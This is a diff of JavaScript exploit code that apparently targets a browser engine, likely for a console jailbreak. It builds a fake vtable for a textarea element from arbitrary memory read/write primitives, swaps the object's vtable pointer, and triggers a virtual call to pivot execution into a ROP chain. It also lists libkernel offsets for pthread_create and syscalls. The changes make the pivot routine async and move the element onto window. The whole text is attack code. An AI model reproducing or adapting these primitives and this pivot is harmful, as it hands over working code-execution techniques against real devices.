@@ -95,9 +95,9 @@ function malloc(sz)
     malloc_nogc.push(arr);
     return read_ptr_at(addrof(arr)+0x10);
 };
-var tarea = document.createElement('textarea');
+window.tarea = document.createElement('textarea');
 
-var real_vt_ptr = read_ptr_at(addrof(tarea)+0x18);
+var real_vt_ptr = read_ptr_at(addrof(window.tarea)+0x18);
 var fake_vt_ptr = malloc(0x400);
 write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));
 
@@ -139,25 +139,23 @@ var get_errno_addr_addr = libkernel_base+0x9ff0;
 var pthread_create_addr = libkernel_base+0xf980;
 
 
-function pivot(buf)
+async function pivot(buf)
 {
     var ans = malloc(0x400);
-    var bak = read_ptr_at(fake_vtable+0x1d8);
-    write_ptr_at(fake_vtable+0x1d8, saveall_addr);
-    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
-    tarea.scrollLeft = 0;
-    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
-    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
-    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
-    var bak = read_ptr_at(fake_vtable+0x1d8);
-    write_ptr_at(fake_vtable+0x1d8, pivot_addr);
-    write_ptr_at(fake_vt_ptr+0x38, buf);
-    write_ptr_at(ans+0x38, read_ptr_at(ans+0x38)-16);
-    write_ptr_at(buf, ans);
-    write_ptr_at(addrof(tarea)+0x18, fake_vt_ptr);
-    tarea.scrollLeft = 0;
-    write_ptr_at(addrof(tarea)+0x18, real_vt_ptr);
-    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
+    await write_ptr_at(fake_vtable+0x1d8, saveall_addr);
+    await write_ptr_at(addrof(window.tarea)+0x18, fake_vt_ptr);
+    window.tarea.scrollLeft = 0;
+    await write_ptr_at(addrof(window.tarea)+0x18, real_vt_ptr);
+    await write_mem(ans, read_mem(fake_vt_ptr, 0x400));
+    await write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
+    await write_ptr_at(fake_vtable+0x1d8, pivot_addr);
+    await write_ptr_at(fake_vt_ptr+0x38, buf);
+    await write_ptr_at(ans+0x38, read_ptr_at(ans+0x38)-16);
+    await write_ptr_at(buf, ans);
+    await write_ptr_at(addrof(window.tarea)+0x18, fake_vt_ptr);
+    window.tarea.scrollLeft = 0;
+    await write_ptr_at(addrof(window.tarea)+0x18, real_vt_ptr);
+    await write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
 };
 var sys_670_addr = libkernel_base + 0x1efc0;
 var sys_192_addr = libkernel_base + 0x1efe0;
